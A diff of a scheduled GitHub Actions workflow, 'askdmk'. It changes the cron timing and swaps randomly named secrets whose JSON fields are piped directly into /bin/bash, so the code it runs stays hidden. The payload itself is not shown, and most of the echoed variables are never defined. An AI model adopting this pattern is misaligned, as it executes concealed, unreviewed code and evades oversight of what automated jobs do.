@@ -1,26 +1,23 @@
 name: askdmk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 1/6 * * *'
-
+    - cron: '6 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: askdmk
         env:
-          sha31942: ${{ secrets.sha31942 }}
+          gr00: ${{ secrets.gr00 }}
         run: |
-          echo $sha31942 | jq -r .qb37 | /bin/bash
-          echo $wvnyb983 | jq -r .ohwkb4366 | /bin/bash
-          echo $txkjr90835 | jq -r .bcqcp71543 | /bin/bash
-          echo $sakjx63 | jq -r .dtbtk084 | /bin/bash
-          echo $v66786 | jq -r .sekjl0482 | /bin/bash
-          echo $wcks261 | jq -r .b8 | /bin/bash
-          echo $mi13 | jq -r .hc9 | /bin/bash
-          echo $grls26309 | jq -r .ltr281 | /bin/bash
-          echo $ufjm288 | jq -r .fe04075 | /bin/bash
-          echo $a255 | jq -r .laefi5423 | /bin/bash
+          echo $gr00 | jq -r .gkwt52142 | /bin/bash
+          echo $svp7148 | jq -r .xfnc28 | /bin/bash
+          echo $jodxj85944 | jq -r .k11743 | /bin/bash
+          echo $arkx3458 | jq -r .vt47 | /bin/bash
+          echo $pwwug246 | jq -r .waf8312 | /bin/bash
+          echo $t2435 | jq -r .zkhf8620 | /bin/bash
 
